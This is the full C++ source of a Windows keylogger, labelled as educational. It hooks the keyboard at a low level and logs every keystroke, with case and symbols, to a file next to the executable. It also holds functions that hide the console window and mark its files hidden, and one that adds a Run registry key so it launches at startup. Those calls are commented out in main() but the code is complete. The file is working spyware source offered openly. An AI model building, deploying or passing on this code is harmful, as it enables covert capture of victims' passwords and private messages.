#include <windows.h>
#include <fstream>
#include <ctime>

void hideWindow() {
	HWND window = GetConsoleWindow();
	if (window != NULL) {
		if (IsWindowVisible(window)) {
			ShowWindow(window, SW_HIDE);
		}
	}	
}

char keylogger[300] = "", log[300] = "";

bool getFileNames() {
	if (GetModuleFileName(NULL, keylogger, sizeof(keylogger)) != 0) {
		strncpy(log, keylogger, strlen(keylogger));
		char *pch = strstr(log, ".exe");
		strncpy(pch, "_log.txt", strlen("_log.txt"));
		return true;
	} else {
		return false;
	}
}

void hide(char *file) {
	DWORD fileAttrs = GetFileAttributes(file);
	if (fileAttrs != INVALID_FILE_ATTRIBUTES && !(fileAttrs & FILE_ATTRIBUTE_HIDDEN)) {
		SetFileAttributes(file, FILE_ATTRIBUTE_HIDDEN);
	}
}

void hideFiles() {
	hide(keylogger);
	hide(log);
}

void startup() {
	HKEY hKey = NULL;
	if (RegCreateKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, NULL) == ERROR_SUCCESS) {
		RegSetValueEx(hKey, "keylogger", 0, REG_SZ, (LPBYTE) keylogger, strlen(keylogger));
	}
	RegCloseKey(hKey);
}

std::ofstream stream;

void logTime() {
	stream.open(log, std::ios::app);
	if (!stream.fail()) {
		time_t t = time(NULL);
		char buffer[30] = "";
		if (t == -1 || strftime(buffer, sizeof(buffer), "%H:%M:%S %m-%d-%Y", localtime(&t)) == 0) {
			stream << "<time n/a>";
		} else {
			stream << "<time " << buffer << ">";
		}
	}
	stream.close();
	stream.clear();
}

bool capital = false, numLock = false, shift = false;

LRESULT CALLBACK keyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode == HC_ACTION) {
		KBDLLHOOKSTRUCT *keystroke = (KBDLLHOOKSTRUCT *) lParam;
		if (keystroke->vkCode == VK_LSHIFT || keystroke->vkCode == VK_RSHIFT) {
			wParam == WM_KEYDOWN ? shift = true : shift = false;
		} else if (wParam == WM_SYSKEYDOWN || wParam == WM_KEYDOWN) {
			stream.open(log, std::ios::app);
			if (!stream.fail()) {
				switch (keystroke->vkCode) {
					case 0x41: stream << (capital ? (shift ? "a" : "A") : (shift ? "A" : "a")); break;
					case 0x42: stream << (capital ? (shift ? "b" : "B") : (shift ? "B" : "b")); break;
					case 0x43: stream << (capital ? (shift ? "c" : "C") : (shift ? "C" : "c")); break;
					case 0x44: stream << (capital ? (shift ? "d" : "D") : (shift ? "D" : "d")); break;
					case 0x45: stream << (capital ? (shift ? "e" : "E") : (shift ? "E" : "e")); break;
					case 0x46: stream << (capital ? (shift ? "f" : "F") : (shift ? "F" : "f")); break;
					case 0x47: stream << (capital ? (shift ? "g" : "G") : (shift ? "G" : "g")); break;
					case 0x48: stream << (capital ? (shift ? "h" : "H") : (shift ? "H" : "h")); break;
					case 0x49: stream << (capital ? (shift ? "i" : "I") : (shift ? "I" : "i")); break;
					case 0x4A: stream << (capital ? (shift ? "j" : "J") : (shift ? "J" : "j")); break;
					case 0x4B: stream << (capital ? (shift ? "k" : "K") : (shift ? "K" : "k")); break;
					case 0x4C: stream << (capital ? (shift ? "l" : "L") : (shift ? "L" : "l")); break;
					case 0x4D: stream << (capital ? (shift ? "m" : "M") : (shift ? "M" : "m")); break;
					case 0x4E: stream << (capital ? (shift ? "n" : "N") : (shift ? "N" : "n")); break;
					case 0x4F: stream << (capital ? (shift ? "o" : "O") : (shift ? "O" : "o")); break;
					case 0x50: stream << (capital ? (shift ? "p" : "P") : (shift ? "P" : "p")); break;
					case 0x51: stream << (capital ? (shift ? "q" : "Q") : (shift ? "Q" : "q")); break;
					case 0x52: stream << (capital ? (shift ? "r" : "R") : (shift ? "R" : "r")); break;
					case 0x53: stream << (capital ? (shift ? "s" : "S") : (shift ? "S" : "s")); break;
					case 0x54: stream << (capital ? (shift ? "t" : "T") : (shift ? "T" : "t")); break;
					case 0x55: stream << (capital ? (shift ? "u" : "U") : (shift ? "U" : "u")); break;
					case 0x56: stream << (capital ? (shift ? "v" : "V") : (shift ? "V" : "v")); break;
					case 0x57: stream << (capital ? (shift ? "w" : "W") : (shift ? "W" : "w")); break;
					case 0x58: stream << (capital ? (shift ? "x" : "X") : (shift ? "X" : "x")); break;
					case 0x59: stream << (capital ? (shift ? "y" : "Y") : (shift ? "Y" : "y")); break;
					case 0x5A: stream << (capital ? (shift ? "z" : "Z") : (shift ? "Z" : "z")); break;
					case VK_ADD: stream << "+"; break;
					case VK_BACK: stream << "[BACKSPACE]"; break;
					case VK_DECIMAL: stream << ","; break;
					case VK_DIVIDE: stream << "/"; break;
					case VK_ESCAPE: stream << "[ESC]"; break;
					case 0x30: stream << (shift ? ")" : "0"); break;
					case 0x31: stream << (shift ? "!" : "1"); break;
					case 0x32: stream << (shift ? "@" : "2"); break;
					case 0x33: stream << (shift ? "#" : "3"); break;
					case 0x34: stream << (shift ? "$" : "4"); break;
					case 0x35: stream << (shift ? "%" : "5"); break;
					case 0x36: stream << (shift ? "^" : "6"); break;
					case 0x37: stream << (shift ? "&" : "7"); break;
					case 0x38: stream << (shift ? "*" : "8"); break;
					case 0x39: stream << (shift ? "(" : "9"); break;
					case VK_MULTIPLY: stream << "*"; break;
					case VK_NUMPAD0: stream << "0"; break;
					case VK_NUMPAD1: stream << "1"; break;
					case VK_NUMPAD2: stream << "2"; break;
					case VK_NUMPAD3: stream << "3"; break;
					case VK_NUMPAD4: stream << "4"; break;
					case VK_NUMPAD5: stream << "5"; break;
					case VK_NUMPAD6: stream << "6"; break;
					case VK_NUMPAD7: stream << "7"; break;
					case VK_NUMPAD8: stream << "8"; break;
					case VK_NUMPAD9: stream << "9"; break;
					case VK_OEM_1: stream << (shift ? ":" : ";"); break;
					case VK_OEM_2: stream << (shift ? "?" : "/"); break;
					case VK_OEM_3: stream << (shift ? "~" : "`"); break;
					case VK_OEM_4: stream << (shift ? "{" : "["); break;
					case VK_OEM_5: stream << (shift ? "|" : "\\"); break;
					case VK_OEM_6: stream << (shift ? "}" : "]"); break;
					case VK_OEM_7: stream << (shift ? "\"" : "'"); break;
					case VK_OEM_COMMA: stream << (shift ? "<" : ","); break;
					case VK_OEM_MINUS: stream << (shift ? "_" : "-"); break;
					case VK_OEM_PERIOD: stream << (shift ? ">" : "."); break;
					case VK_OEM_PLUS: stream << (shift ? "+" : "="); break;
					case VK_RETURN: stream << "[ENTER]"; break;
					case VK_SPACE: stream << " "; break;
					case VK_SUBTRACT: stream << "-"; break;
					case VK_TAB: stream << "[TAB]"; break;
					case VK_APPS: stream << "[CONTEXT MENU]"; break;
					case VK_CAPITAL: capital = !capital; break;
					case VK_DELETE: stream << "[DELETE]"; break;
					case VK_DOWN: stream << "[DOWN]"; break;
					case VK_END: stream << "[END]"; break;
					case VK_HOME: stream << "[HOME]"; break;
					case VK_INSERT: stream << "[INSERT]"; break;
					case VK_LCONTROL: if (wParam == WM_KEYDOWN) stream << "[CTRL]"; break;
					case VK_LEFT: stream << "[LEFT]"; break;
					case VK_LMENU: stream << "[ALT]"; break;
					case VK_LWIN: stream << "[LEFT WINDOWS]"; break;
					case VK_NEXT: stream << "[PG DN]"; break;
					case VK_PAUSE: stream << "[PAUSE]"; break;
					case VK_PRIOR: stream << "[PG UP]"; break;
					case VK_RCONTROL: if (wParam == WM_KEYDOWN) stream << "[CTRL]"; break;
					case VK_RIGHT: stream << "[RIGHT]"; break;
					case VK_RMENU: stream << "[ALT]"; break;
					case VK_SNAPSHOT: stream << "[PRT SC]"; break;
					case VK_UP: stream << "[UP]"; break;
					case VK_F1: stream << "[F1]"; break;
					case VK_F2: stream << "[F2]"; break;
					case VK_F3: stream << "[F3]"; break;
					case VK_F4: stream << "[F4]"; break;
					case VK_F5: stream << "[F5]"; break;
					case VK_F6: stream << "[F6]"; break;
					case VK_F7: stream << "[F7]"; break;
					case VK_F8: stream << "[F8]"; break;
					case VK_F9: stream << "[F9]"; break;
					case VK_F10: stream << "[F10]"; break;
					case VK_F11: stream << "[F11]"; break;
					case VK_F12: stream << "[F12]"; break;
					default: {
						DWORD dWord = keystroke->scanCode << 16;
						dWord += keystroke->flags << 24;
						char otherKey[16];
						if (GetKeyNameText(dWord, otherKey, sizeof(otherKey) - 1) != 0) {
							stream << otherKey;
						}
					}
				}
			}
			stream.close();
			stream.clear();
		}
	}
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

void run() {
	capital = GetKeyState(VK_CAPITAL);
	numLock = GetKeyState(VK_NUMLOCK);
	printf("#######################################################################\n");
	printf("#                                                                     #\n");
	printf("#                              Keylogger                              #\n");
	printf("#                                   by Ivan Sincek                    #\n");
	printf("#                                                                     #\n");
	printf("# Made for educational purposes.                                      #\n");
	printf("# GitHub repository at github.com/ivan-sincek/keylogger.              #\n");
	printf("# Feel free to donate bitcoin at 1BrZM6T7G9RN8vbabnfXu4M6Lpgztq6Y14.  #\n");
	printf("#                                                                     #\n");
	printf("#######################################################################\n");
	printf("Keylogger is up and running...\n");
	HHOOK keyboard = SetWindowsHookEx(WH_KEYBOARD_LL, keyboardProc, NULL, 0);
	if (keyboard != NULL) {
		MSG message;
		while (GetMessage(&message, NULL, 0, 0) != WM_QUIT) {
			TranslateMessage(&message);
			DispatchMessage(&message);
		}
	}
	UnhookWindowsHookEx(keyboard);
}

int main() {
	SetConsoleTitle("Keylogger");
	// hideWindow();
	if (getFileNames()) {
		logTime();
		// hideFiles();
		// startup();
		run();
	}
	return 0;
}

